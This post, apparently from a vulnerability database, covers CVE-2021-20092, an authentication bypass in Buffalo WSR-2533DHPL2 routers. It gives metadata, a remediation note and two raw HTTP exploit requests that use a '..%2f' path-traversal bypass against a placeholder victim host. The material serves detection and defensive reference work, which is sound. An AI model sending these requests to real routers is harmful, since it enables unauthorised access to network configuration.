---
layout: "post"
cve_id: "CVE-2021-20092"
title: "Buffalo WSR-2533DHPL2 - Improper Access Control"
pcap: true
pcap_path: "/pcaps/2021/CVE-2021-20092.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-20092.yaml"
author: "gy741,pdteam,parth"
severity: "high"
impact: "An attacker can exploit this vulnerability to gain unauthorized access to the router's configuration settings and potentially compromise the entire network.
"
remediation: "Apply the latest firmware update provided by Buffalo to fix the access control issue.
"
reference:
  - "https://www.tenable.com/security/research/tra-2021-13"
  - "https://medium.com/tenable-techblog/bypassing-authentication-on-arcadyan-routers-with-cve-2021-20090-and-rooting-some-buffalo-ea1dd30980c2"
  - "https://nvd.nist.gov/vuln/detail/CVE-2021-20091"
  - "https://github.com/ARPSyndicate/cvemon"
  - "https://github.com/ARPSyndicate/kenzer-templates"
classification: "{'cvss-metrics': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N', 'cvss-score': 7.5, 'cve-id': 'CVE-2021-20092', 'cwe-id': 'CWE-287', 'epss-score': 0.68874, 'epss-percentile': 0.98567, 'cpe': 'cpe:2.3:o:buffalo:wsr-2533dhpl2-bk_firmware:*:*:*:*:*:*:*:*'}"
metadata: "{'max-request': 2, 'vendor': 'buffalo', 'product': 'wsr-2533dhpl2-bk_firmware'}"
tags:
  - "cve2021"
  - "cve"
  - "buffalo"
  - "firmware"
  - "iot"
  - "tenable"
  - "vkev"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## üîç Vulnerability Description
The web interfaces of Buffalo WSR-2533DHPL2 firmware version <= 1.02 and WSR-2533DHP3 firmware version <= 1.24 do not properly restrict access to sensitive information from an unauthorized actor.


## üåê HTTP Request
```nohighlight
GET /images/..%2finfo.html HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Connection: close
Referer: http://www.victim.com/info.html
Accept-Encoding: gzip
```

```nohighlight
GET /images/..%2fcgi/cgi_i_filter.js?_tn={{trimprefix(base64_decode(httoken), HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15
Connection: close
Content-Type: application/x-www-form-urlencoded
Cookie: lang=8; url=ping.html; mobile=false;
Referer: http://www.victim.com/info.html
Accept-Encoding: gzip
```

